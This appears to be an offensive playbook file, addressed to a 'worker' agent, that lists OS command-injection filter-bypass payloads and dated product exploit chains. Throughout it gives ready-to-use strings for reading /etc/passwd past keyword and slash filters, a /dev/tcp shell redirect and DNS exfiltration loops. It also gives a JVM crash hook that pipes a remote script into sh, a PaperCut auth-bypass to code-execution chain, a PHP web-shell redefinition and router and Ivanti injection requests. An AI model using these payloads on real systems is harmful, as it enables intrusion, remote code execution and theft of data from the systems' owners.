# OS command-injection filter-bypass string library + CVE-style injection chains — Open WHEN: you have a confirmed or strongly-suspected OS-command sink (ping/host/cmd/exec wrapper) AND a naive payload (`;id`, `| id`) was filtered, OR you fingerprinted a product/version matching a chain below

Worker already has the basic delimiter/IFS/glob/base64/hex set from the skill body. This file is ONLY the extra
filter-bypass forms and the dated product chains those don't cover. Pick the section that matches the live block.

## No-space bypass forms beyond `${IFS}`

```bash
# Windows env-var substring expands to a literal space (no space char in payload)
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
# ANSI-C quoting builds the whole command incl. its embedded space (\x20)
X=$'uname\x20-a'&&$X
# tab (URL %09) instead of space
;ls%09-al%09/home
# input redirection (no space, no cat arg)
cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242
```

## Backslash-newline splitting (defeats keyword denylists)

```bash
# raw: the command is reassembled across the line break
cat /et\
c/pa\
sswd
# URL-encoded for the wire
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## Tilde + brace expansion (no quotes, no slashes in the keyword)

```bash
echo ~+          # $PWD
echo ~-          # $OLDPWD
{cat,/etc/passwd}            # comma = arg separator, no space
{,ifconfig,eth0}             # leading empty element
{l,-lh}s                     # builds: ls -lh
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,} # glob-only cat /etc/passwd
```

## Slash + character bypass without `/` or `\`

```bash
echo ${HOME:0:1}             # -> /   (first char of $HOME)
cat ${HOME:0:1}etc${HOME:0:1}passwd
# tr to synthesise '/' from punctuation that is not filtered
echo . | tr '!-0' '"-1'      # -> /
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
# variable-replacement to delete junk inserted to dodge the keyword filter
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

## Token-glueing forms beyond single/double-quote splitting

```bash
wh``oami                     # empty backtick block
who$@ami                     # $@ expands to nothing
echo whoami|$0               # $0 = current shell, re-reads piped command
who$()ami                    # empty command-substitution
who$(echo am)i               # builds whoami from a substring
/\b\i\n/////s\h              # backslash-noise + collapsing slashes -> /bin/sh
```

## Polyglot one-liners (single string fires across quote/eval contexts)

```bash
# Fires inside bash incl. when wrapped in single OR double quotes:
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
# Multi-language (bash subshell + JS/PHP eval contexts), all paths sleep 5:
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

## Blind char-by-char extraction via timing (no OAST needed)

```bash
# 5 s delay iff first char of whoami == 's'; binary-search each position
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

## DNS char-by-char exfil loop (when only an OAST DNS channel is back)

```bash
# each token of `ls /` becomes a DNS label under your collaborator subdomain
for i in $(ls /); do host "$i.<token>.oast.tld"; done
# nslookup variant for hosts without `host`
for i in $(id); do nslookup "$i.<token>.oast.tld"; done
```

## Hex-encoded filename/command (keyword + slash both filtered)

```bash
# `cat /etc/passwd` with no literal slash/keyword on the wire
cat `xxd -r -p <<< 2f6574632f706173737764`          # 2f6574632f706173737764 = /etc/passwd
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`   # whole command hex-built
```

## Tricks for unstable/timeout-killed channels

```bash
# survive parent timeout when the injector kills long jobs
nohup sleep 120 > /dev/null &
# `--` ends options: everything after is treated as filenames, strips trailing args
... ; rm -- -trailing-injected-flag
```

## Argument / option injection (no shell metacharacters — survives execFile/execve)

Use when input is passed as an argv element to a downstream tool and metacharacters are stripped. A value that
starts with `-`/`--` is parsed as a flag. Confirm via Sonar's argument-injection-vectors matrix.

```bash
chrome '--gpu-launcher="id>/tmp/foo"'        # any Chromium wrapper
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
psql -o'|id>/tmp/foo'
tcpdump -i any -G 1 -W 1 -z /path/script.sh  # post-rotate exec in unsafe wrappers
ping -c 100000 / -f                          # flag-flip DoS on embedded ping UIs
```

WorstFit (Windows ANSI): fullwidth `＂` (U+FF02) survives `escapeshellarg`, then narrows back to `"` after a
Best-Fit transform, re-opening argument injection. Seen against `system("wget.exe -q ".escapeshellarg($url))`:

```
＂ --use-askpass=calc ＂
```

## Centralised CGI dispatcher chains (embedded routers, IoT)

Many SOHO routers route every handler through one `.cgi` with a `topicurl=<handler>` selector reusing one weak
validator — break one handler, break all.

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

topicurl=setEasyMeshAgentCfg&agentName=;id;     # TOTOLINK X6000R-class concat-into-shell RCE
topicurl=<handler>&param=-n                       # argv flag-flip into the downstream tool
```

## CVE-style and product chains

### Ivanti EPMM RewriteMap bash-arithmetic RCE (CVE-2026-1281 / -1340)
Bash RewriteMap helpers push query params into globals, then compare in an arithmetic context (`[[ a -gt b ]]`,
`$((...))`, `let`). Arithmetic expansion re-tokenises, so an array-index string runs as a command — bypassing
metacharacter filters entirely. `st`→global name, `h`→its value:

```bash
# ~5s delay then 404 == vulnerable. Also probe /mifs/c/aftstore/fob/ and siblings.
curl -k "https://TARGET/mifs/c/appstore/fob/ANY?st=theValue&h=gPath['sleep 5']"
```

### Synology Photos ≤ 1.7.0-0794 (Pwn2Own Ireland 2024)
Unauthenticated WebSocket event drops user-controlled data into `id_user`, later interpolated into a Node
`exec()` (`/bin/sh -c`). Inject shell metacharacters in the `id_user` field of the WS event.

### JVM diagnostic-arg exec (any sink that sets `_JAVA_OPTIONS` / launcher flags / `AdditionalJavaArguments`)
Force a crash, hook the crash to a command — no app bytecode, no shell metacharacters needed:

```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://x.tld/p.sh|sh'"
-XX:MaxMetaspaceSize=12m -XX:OnError="cmd.exe /c calc" -XX:+CrashOnOutOfMemoryError
```

### PaperCut NG/MF auth-bypass → print-scripting RCE (CVE-2023-27350)
Browse `/app?service=page/SetupCompleted`, click Login → valid `JSESSIONID` with no creds. In Options → Config
Editor set `print-and-device.script.enabled=Y` and `print.script.sandboxed=N`. In the printer Scripting tab put
the command OUTSIDE the hook so it runs on Apply (no print job):

```js
function printJobHook(inputs, actions) {}
java.lang.Runtime.getRuntime().exec(["bash","-c","curl http://x.tld/hit"]);
```

### PHP `runkit` rule-engine RCE
Admin UI that evaluates user PHP "rules" with `runkit`/`runkit7` loaded → redefine a function the rules call,
storing a persistent web-context primitive:

```php
runkit_function_redefine('checkBid', '$bid', 'system($_GET["cmd"]); return true;');
```

### Windows space-less spawn via wildcard path expansion

```powershell
powershell C:\*\*2\n??e*d.*?       # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc (^ caret-escapes break keyword filters)
```
